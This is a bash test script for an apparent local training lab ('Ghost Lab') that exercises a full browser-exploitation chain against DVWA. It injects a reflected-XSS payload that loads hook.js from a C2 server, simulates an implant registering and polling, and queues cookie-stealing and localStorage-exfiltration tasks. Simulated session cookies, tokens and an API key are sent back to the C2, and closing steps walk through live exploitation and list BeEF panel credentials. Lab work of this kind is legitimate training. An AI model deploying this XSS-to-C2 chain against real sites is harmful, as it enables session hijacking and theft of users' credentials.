#!/bin/bash
##############################################################################
# Ghost Lab — Full Chain Test
#
# Tests the entire attack chain via curl + C2 API:
#   1. DVWA XSS reflects our hook.js payload
#   2. Implant registers with C2
#   3. Operator queues tasks
#   4. Implant polls and receives tasks
#   5. Implant returns results
#   6. Operator views results
#
# For REAL browser testing, open:
#   http://localhost:8080/vulnerabilities/xss_r/?name=<script src="http://localhost:5000/hook.js"></script>
#   Then watch http://localhost:5000 for the agent to appear.
##############################################################################

set -e
C2="http://localhost:5000"
GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  GHOST LAB — Full Chain Test${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
echo ""

# ─── 1. Verify services ──────────────────────────────────────────
echo -e "${CYAN}[1/6] Checking services...${NC}"
for svc in "localhost:8080|DVWA" "localhost:3000|Juice Shop" "localhost:5000|Ghost C2" "localhost:3333|BeEF"; do
  HOST=$(echo $svc | cut -d'|' -f1)
  NAME=$(echo $svc | cut -d'|' -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://$HOST" 2>/dev/null || echo "000")
  if [ "$CODE" = "200" ] || [ "$CODE" = "302" ]; then
    echo -e "  ${GREEN}OK${NC}  $NAME ($HOST) → $CODE"
  else
    echo -e "  ${RED}FAIL${NC}  $NAME ($HOST) → $CODE"
  fi
done
echo ""

# ─── 2. Test XSS injection ──────────────────────────────────────
echo -e "${CYAN}[2/6] Testing XSS injection in DVWA...${NC}"

# Login to DVWA
curl -s -c /tmp/ghost_test_jar http://localhost:8080/login.php -o /tmp/ghost_login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" /tmp/ghost_login.html)
curl -s -b /tmp/ghost_test_jar -c /tmp/ghost_test_jar \
  -X POST http://localhost:8080/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" -o /dev/null
sed -i '/security/d' /tmp/ghost_test_jar
echo -e "localhost\tFALSE\t/\tFALSE\t0\tsecurity\tlow" >> /tmp/ghost_test_jar

# Inject XSS
PAYLOAD='%3Cscript%20src%3D%22http%3A//localhost%3A5000/hook.js%22%3E%3C/script%3E'
RESULT=$(curl -s -b /tmp/ghost_test_jar "http://localhost:8080/vulnerabilities/xss_r/?name=$PAYLOAD")
if echo "$RESULT" | grep -q "hook.js"; then
  echo -e "  ${GREEN}OK${NC}  hook.js reflected in DVWA response"
else
  echo -e "  ${RED}FAIL${NC}  hook.js NOT found in response"
fi
echo ""

# ─── 3. Simulate implant registration ───────────────────────────
echo -e "${CYAN}[3/6] Simulating implant registration...${NC}"
REG_RESPONSE=$(curl -s -X POST $C2/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0",
    "url": "http://localhost:8080/vulnerabilities/xss_r/?name=<script src=hook.js>",
    "cookies": "PHPSESSID=simulated_session; security=low",
    "screen": "1920x1080",
    "language": "en-US",
    "platform": "Linux x86_64",
    "local_storage_keys": ["theme", "session_data"]
  }')
AGENT_ID=$(echo "$REG_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['agent_id'])")
echo -e "  ${GREEN}OK${NC}  Agent registered: ${CYAN}$AGENT_ID${NC}"
echo ""

# ─── 4. Queue tasks ─────────────────────────────────────────────
echo -e "${CYAN}[4/6] Queuing tasks from operator panel...${NC}"
for TASK_TYPE in steal_cookies exfil_localstorage screenshot; do
  TASK_RESP=$(curl -s -X POST $C2/panel/task \
    -H "Content-Type: application/json" \
    -d "{\"agent_id\": \"$AGENT_ID\", \"type\": \"$TASK_TYPE\"}")
  TASK_ID=$(echo "$TASK_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['task_id'])")
  echo -e "  ${GREEN}QUEUED${NC}  $TASK_TYPE → task_id=$TASK_ID"
done
echo ""

# ─── 5. Simulate implant polling + executing ─────────────────────
echo -e "${CYAN}[5/6] Simulating implant poll loop...${NC}"
for i in 1 2 3; do
  TASK=$(curl -s "$C2/api/task/$AGENT_ID")
  TASK_TYPE=$(echo "$TASK" | python3 -c "import sys,json; print(json.load(sys.stdin).get('type','noop'))")

  if [ "$TASK_TYPE" = "noop" ]; then
    echo -e "  No more tasks"
    break
  fi

  TASK_ID=$(echo "$TASK" | python3 -c "import sys,json; print(json.load(sys.stdin).get('task_id','?'))")
  echo -e "  ${CYAN}RECV${NC}  $TASK_TYPE (task_id=$TASK_ID)"

  # Simulate result based on task type
  case "$TASK_TYPE" in
    steal_cookies)
      DATA='{"cookies": "PHPSESSID=abc123; security=low; admin_token=eyJhbGciOi..."}'
      ;;
    exfil_localstorage)
      DATA='{"local_storage": {"theme": "dark", "session_data": "user=admin;role=superuser", "api_key": "sk-live-xxxx"}}'
      ;;
    screenshot)
      DATA='{"title": "DVWA :: XSS Reflected", "url": "http://localhost:8080/vulnerabilities/xss_r/", "forms": [{"action": "#", "method": "GET", "inputs": [{"name": "name", "type": "text", "value": ""}]}], "links": [{"href": "/about.php", "text": "About"}, {"href": "/security.php", "text": "DVWA Security"}]}'
      ;;
    *)
      DATA='{"output": "executed"}'
      ;;
  esac

  curl -s -X POST $C2/api/result \
    -H "Content-Type: application/json" \
    -d "{\"agent_id\": \"$AGENT_ID\", \"task_type\": \"$TASK_TYPE\", \"task_id\": \"$TASK_ID\", \"data\": $DATA}" > /dev/null

  echo -e "  ${GREEN}SENT${NC}  result for $TASK_TYPE"
done
echo ""

# ─── 6. View results ────────────────────────────────────────────
echo -e "${CYAN}[6/6] Results on C2:${NC}"
curl -s $C2/panel/agent/$AGENT_ID/results | python3 -m json.tool 2>/dev/null | head -40
echo ""

# ─── Summary ────────────────────────────────────────────────────
echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  Chain test complete.${NC}"
echo ""
echo -e "  ${CYAN}For REAL browser exploitation:${NC}"
echo ""
echo -e "  1. Open DVWA:       http://localhost:8080"
echo -e "     Login:           admin / password"
echo -e "     Set security:    Low"
echo ""
echo -e "  2. Go to Reflected XSS and enter:"
echo -e "     ${RED}<script src=\"http://localhost:5000/hook.js\"></script>${NC}"
echo ""
echo -e "  3. Watch C2 dashboard: ${GREEN}http://localhost:5000${NC}"
echo -e "     Agent appears → click it → run commands"
echo ""
echo -e "  4. BeEF panel:      http://localhost:3333/ui/panel"
echo -e "     Login:           ghost / ghostlab2026"
echo -e "     Hook URL:        http://localhost:3333/hook.js"
echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"

# Cleanup
rm -f /tmp/ghost_test_jar /tmp/ghost_login.html
